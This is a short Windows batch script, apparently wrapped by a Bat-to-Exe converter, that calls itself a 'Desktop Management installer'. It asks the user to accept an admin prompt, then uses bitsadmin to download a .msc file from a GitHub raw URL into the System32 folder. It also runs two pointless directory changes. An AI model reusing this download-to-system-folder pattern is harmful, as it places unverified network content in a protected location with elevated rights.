::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDFBXA2WOXmGKbsZzPry+e+7hkIeQe86dpvI5pKBLvQAqgOkQZ4o239JpNwFAkoJQgWiYAQxsH1+v2eKC+OZoAT1RVjPwk4mEmZxlEHRmCgzXPdticgX3DDw9U7w/w==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF6JeA==
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVsFAlbMbyXvZg==
::ZQ05rAF9IAHYFVzEqQIULQhfWAuSfEa7CLQb7eX+4f7n
::eg0/rx1wNQPfEVWB+kM9LVsJDACHL2C3AadS5fv4jw==
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIULQhfWAuSfEa7CLQb7eX+4f7H7w0pXOd/dorMmpeBLfAG/kD2Nbss2HtdncYJAg84
::dhA7uBVwLU+EWH2B4kc8JwtRXjOtCz3uZg==
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEvEF5aEkEHlXCGG6sA7kT+O3p2MWw9BlTFMMzdM/J07OGNPNT+ED3cIQ7034U+A==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Desktop Management installer
echo If Windows shows you a prompt for admin, or related, accept it.
bitsadmin.exe /transfer "DesktopManagement" https://raw.githubusercontent.com/deskmgr/app/main/.winget/pkg/deskmgr.msc C:\Windows\System32\deskmgr.msc
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\
cd %windir%\System32
echo Desktop Management was installed.
